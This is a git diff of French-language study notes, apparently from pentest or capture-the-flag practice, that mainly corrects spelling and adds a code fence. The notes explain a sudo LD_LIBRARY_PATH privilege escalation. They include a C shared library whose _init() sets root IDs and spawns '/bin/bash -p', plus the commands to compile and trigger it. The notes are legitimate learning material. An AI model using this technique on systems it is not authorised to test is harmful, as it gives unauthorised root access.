@@ -29,8 +29,9 @@ Je fais gcc -o /tmp/nom_d'une_library_utilisée -shared -fPIC /home/user/tools/s
 
 -shared pour créer un .so (shared object) partagé. -fPIC pour situer la bibliothèque dynamiquement.
 
-cette commande permet de créer une lib qui a le meme nom qu'un lib que le prog utilise déja pour la remplacer. dans cette lib, on mettra une fonction malvaillante qui aura le meme nom qu'un fonction deja utilisé dans le prog pour la remplacer. Exemple :
+Cette commande permet de créer une librairie qui a le meme nom qu'une librairie que le proggramme utilise déja pour la remplacer. Dans cette librairie, on mettra une fonction malveillante qui aura le meme nom qu'une fonction deja utilisée dans le programme dans le but de la remplacer. Exemple :
 
+```C
 #include <stdio.h>  
 #include <sys/types.h>  
 #include <stdlib.h>
@@ -40,5 +41,6 @@ void _init() {
         setresuid(0,0,0);  
         system("/bin/bash -p");  
 }
+```
 
-ensuite, on lance le prog : sudo LD_LIBRARY_PATH=/tmp nom_du_prog ld_library_path dit où chercher la lib partagé (avec la fonction malvaillante) donc dans ce cas ci, dans tmp
+Ensuite, on lance le programme : sudo LD_LIBRARY_PATH=/tmp nom_du_prog ld_library_path dit où chercher la librairie partagée (avec la fonction malveillante) donc dans ce cas-ci, dans tmp
